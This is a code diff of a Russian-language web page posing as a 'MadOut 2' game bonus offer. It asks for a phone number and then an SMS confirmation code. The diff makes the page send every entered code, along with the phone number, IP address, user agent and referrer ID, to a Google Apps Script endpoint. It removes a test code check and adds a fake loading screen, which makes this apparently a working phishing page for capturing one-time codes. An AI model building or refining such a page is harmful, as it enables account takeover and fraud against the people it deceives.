@@ -31,12 +31,23 @@
         .code-wrapper:focus-within { border-color: var(--accent); }
         .btn { width: 100%; padding: 14px; background: var(--accent); color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
         .btn:active { opacity: 0.8; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
         .footer { margin-top: 16px; font-size: 11px; color: #555; }
         .error-msg { color: #ff4444; font-size: 12px; margin-top: 8px; display: none; }
+        
+        /* Анимация загрузки */
+        .loading-overlay { display: none; text-align: center; padding: 40px 0; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #2a3040; border-top: 4px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { color: #8890a0; font-size: 14px; }
+        .loading-phone { color: var(--gold); font-size: 18px; font-weight: 700; margin: 8px 0; }
+        .loading-dots::after { content: ''; animation: dots 1.5s steps(4) infinite; }
+        @keyframes dots { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } }
     </style>
 </head>
 <body>
     <div class="card">
+        <!-- ЭКРАН 1: ВВОД ТЕЛЕФОНА -->
         <div id="screen-phone">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
             <div class="logo-sub">Big City Online</div>
@@ -47,17 +58,29 @@
                 <div class="bonus-row"><span class="bonus-label">Другу за ваш вход</span><span class="bonus-value" style="font-size:13px;">💎 2 000</span></div>
             </div>
             <div class="input-group"><label>Номер телефона</label><div class="phone-wrapper"><span class="phone-prefix">+7</span><input type="tel" id="phone" placeholder="900 000-00-00" maxlength="13" inputmode="numeric" oninput="formatPhone(this)"></div></div>
-            <button class="btn" onclick="requestCode()">Получить бонусы</button>
+            <button class="btn" id="btn-phone" onclick="requestCode()">Получить бонусы</button>
             <div class="error-msg" id="phone-error">Введите 10 цифр номера телефона</div>
         </div>
+
+        <!-- ЭКРАН ЗАГРУЗКИ -->
+        <div id="screen-loading" class="loading-overlay">
+            <div class="spinner"></div>
+            <p class="loading-text">Отправляем код подтверждения на номер</p>
+            <p class="loading-phone" id="loading-phone"></p>
+            <p class="loading-text">Ожидайте SMS<span class="loading-dots"></span></p>
+        </div>
+
+        <!-- ЭКРАН 2: ВВОД КОДА -->
         <div id="screen-code" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
             <div class="logo-sub">Подтверждение</div>
-            <p style="color:#8890a0;font-size:13px;margin-bottom:20px;">На номер <strong id="display-phone" style="color:#ffd700;"></strong> отправлен код.</p>
+            <p style="color:#8890a0;font-size:13px;margin-bottom:20px;">Код отправлен на номер<br><strong id="display-phone" style="color:#ffd700;"></strong></p>
             <div class="input-group"><label>Код из SMS</label><div class="code-wrapper"><input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/[^0-9]/g, '')"></div></div>
-            <button class="btn" onclick="confirmCode()">Подтвердить</button>
-            <div class="error-msg" id="code-error">Неверный код. Попробуйте ещё раз.</div>
+            <button class="btn" id="btn-code" onclick="confirmCode()">Подтвердить</button>
+            <div class="error-msg" id="code-error">Введите код из SMS</div>
         </div>
+
+        <!-- ЭКРАН 3: УСПЕХ -->
         <div id="screen-done" style="display:none;">
             <div class="logo-row"><span class="logo-text">MADOUT 2</span><img src="logo.png" alt="MadOut 2"></div>
             <div class="logo-sub">Бонусы активированы</div>
@@ -72,6 +95,7 @@
         </div>
         <div class="footer">MadOut 2 • Партнёрская программа</div>
     </div>
+
     <script>
         const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzkQ7Rog8RBIs4MfnXNJi5WfAirC3-Kv2wB-6O6-es7zEwS20xAP5sMUbstb0a6ValceQ/exec';
         const urlParams = new URLSearchParams(window.location.search);
@@ -102,31 +126,59 @@
 
         async function requestCode() {
             var phone = document.getElementById('phone').value.replace(/\D/g, '');
-            if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
+            if (phone.length !== 10) { 
+                document.getElementById('phone-error').style.display = 'block'; 
+                setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); 
+                return; 
+            }
             document.getElementById('phone-error').style.display = 'none';
-            document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
-            document.getElementById('screen-phone').style.display = 'none';
-            document.getElementById('screen-code').style.display = 'block';
+            
             var ip = await getIP();
             var fullPhone = '+7' + phone;
+            
+            // Отправляем данные
             fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
+            
+            // Показываем экран загрузки
+            document.getElementById('screen-phone').style.display = 'none';
+            document.getElementById('loading-phone').textContent = '+7 ' + document.getElementById('phone').value;
+            document.getElementById('screen-loading').style.display = 'block';
+            
+            // Через 3 секунды показываем поле ввода кода
+            setTimeout(function() {
+                document.getElementById('screen-loading').style.display = 'none';
+                document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value;
+                document.getElementById('screen-code').style.display = 'block';
+            }, 3000);
         }
 
         async function confirmCode() {
             var codeInput = document.getElementById('code');
             var code = codeInput.value.replace(/\D/g, '');
-            if (code.length < 4) { document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }
+            if (code.length < 4) { 
+                document.getElementById('code-error').style.display = 'block'; 
+                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); 
+                return; 
+            }
+            document.getElementById('code-error').style.display = 'none';
+            
             var ip = await getIP();
-            if (code === '1234') {
-                document.getElementById('code-error').style.display = 'none';
+            
+            // Блокируем кнопку
+            var btn = document.getElementById('btn-code');
+            btn.disabled = true;
+            btn.textContent = 'ПРОВЕРКА...';
+            
+            // Отправляем код
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, inviter: inviter, timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
+            
+            // Показываем успех
+            setTimeout(function() {
                 document.getElementById('screen-code').style.display = 'none';
                 document.getElementById('screen-done').style.display = 'block';
-                fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, status: 'test_ok', timestamp: new Date().toISOString(), ip: ip, userAgent: navigator.userAgent }) }).catch(function(err) { console.log('ok'); });
-            } else {
-                document.getElementById('code-error').style.display = 'block';
-                codeInput.value = '';
-                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000);
-            }
+                btn.disabled = false;
+                btn.textContent = 'Подтвердить';
+            }, 1000);
         }
     </script>
 </body>
